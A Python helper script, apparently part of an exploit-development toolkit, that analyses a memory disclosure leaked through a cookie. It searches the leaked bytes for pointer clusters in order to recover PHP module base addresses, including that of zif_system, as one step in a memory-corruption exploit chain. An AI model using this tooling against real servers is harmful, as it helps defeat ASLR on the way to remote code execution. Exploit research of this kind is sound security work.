# SPDX-License-Identifier: MIT
# Copyright (c) 2026 GG ADVANCED IT Security UG

"""analyze_leak.py - what is actually in a disclosure window, without assuming a build.

`leak_addrs.py` answers "give me the addresses"; this answers "is there anything here to derive them
from, and if not, what is there instead". It was written after the amd64 run: the window came back a
full 800 KiB, `leak_addrs` refused (correctly), and the interesting question was what the window held.

It prints, for a decoded cookie or a raw window:

  * how many qwords look like user-space pointers at all, and their 32-bit prefixes - on x86-64 the
    heap is not necessarily at 0x7f..., so a fixed range test finds nothing;
  * every base that at least N qwords agree on, for a given set of symbol offsets (a real cluster has
    hundreds of votes; two votes is a coincidence);
  * the repeated exact values, which is how zend_string headers (`0x100000001`) show up.

usage:
  analyze_leak.py --cookie-file /tmp/ck64 --symbol zval_ptr_dtor=0x65eb60 --symbol zif_system=0x465370
  analyze_leak.py --dump /tmp/window.bin --min-votes 4
"""
import argparse
import collections
import sys
import urllib.parse


def load(path, decode):
    raw = open(path, "rb").read()
    return urllib.parse.unquote_to_bytes(raw) if decode else raw


def main() -> int:
    ap = argparse.ArgumentParser(description="inspect a disclosure window")
    src = ap.add_mutually_exclusive_group(required=True)
    src.add_argument("--cookie-file", help="Set-Cookie value, percent-encoded")
    src.add_argument("--dump", help="raw window bytes")
    ap.add_argument("--symbol", action="append", default=[],
                    help="name=offset inside the module, repeatable")
    ap.add_argument("--min-votes", type=int, default=4,
                    help="votes a base needs before it is reported (default 4)")
    ap.add_argument("--prefix-limit", type=int, default=6)
    args = ap.parse_args()

    blob = load(args.cookie_file or args.dump, bool(args.cookie_file))
    qwords = [int.from_bytes(blob[i:i + 8], "little") for i in range(0, len(blob) - 7, 8)]
    print("window: %d bytes, %d qwords" % (len(blob), len(qwords)))

    # A user-space pointer on any 64-bit target: bit 47 clear and above the null page. Deliberately not
    # a 0x7f... test - on x86-64 the heap turned out to sit at 0x7697..., which such a test misses.
    candidates = [q for q in qwords if 0x10000 < q < (1 << 47)]
    print("user-space-looking qwords: %d (%.1f%%)"
          % (len(candidates), 100.0 * len(candidates) / max(len(qwords), 1)))

    prefixes = collections.Counter(q >> 32 for q in candidates)
    if prefixes:
        print("top 32-bit prefixes (a cluster of module pointers shares one):")
        for prefix, count in prefixes.most_common(args.prefix_limit):
            print("   %#010x00000000  x%d" % (prefix, count))

    symbols = {}
    for item in args.symbol:
        name, _, value = item.partition("=")
        try:
            symbols[name] = int(value, 0)
        except ValueError:
            sys.exit("bad symbol spec %r (want name=0xoffset)" % item)

    if symbols:
        votes = collections.Counter()
        for qword in candidates:
            for offset in symbols.values():
                base = qword - offset
                if base & 0xFFF == 0:          # module bases are page-aligned
                    votes[base] += 1
        strong = [(b, n) for b, n in votes.most_common(4) if n >= args.min_votes]
        if strong:
            print("candidate module bases (>= %d votes):" % args.min_votes)
            for base, count in strong:
                agree = ["%s x%d" % (name, sum(1 for q in candidates if q == base + off))
                         for name, off in symbols.items()
                         if sum(1 for q in candidates if q == base + off)]
                print("   base=%#x  votes=%d  %s" % (base, count, ", ".join(agree)))
        else:
            print("no module base reached %d votes - the window holds no symbol cluster."
                  % args.min_votes)
            print("=> the window is readable but the forged geometry does not put destructor-bearing")
            print("   structures in it; this is a calibration gap, not a decoding one.")

    repeated = collections.Counter(candidates).most_common(5)
    if repeated:
        print("most repeated exact values:")
        for value, count in repeated:
            print("   %#x  x%d" % (value, count))
    return 0


if __name__ == "__main__":
    sys.exit(main())
